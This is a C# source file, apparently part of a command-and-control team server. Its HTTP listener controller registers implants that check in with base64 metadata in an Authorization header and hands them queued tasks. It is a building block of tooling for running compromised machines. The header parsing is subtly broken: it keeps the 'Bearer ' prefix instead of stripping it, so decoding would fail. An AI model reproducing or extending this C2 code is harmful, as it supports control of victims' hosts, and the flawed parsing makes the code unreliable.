using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

using Newtonsoft.Json;

using System;
using System.Text;

using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }

        public IActionResult HandleImplant()
        {
            var metadata = ExtactMetadata(HttpContext.Request.Headers);
            if (metadata == null) return NotFound();

            var agent = _agents.GetAgent(metadata.Id);
            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }

            var tasks = agent.GetPendingTasks();

            return Ok(tasks);
        }

        private AgentMetaData ExtactMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            // Authorization: Bearer <Base64> 
            encodedMetadata = encodedMetadata.ToString().Substring(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));

            return JsonConvert.DeserializeObject<AgentMetaData>(json);
        }
    }
}
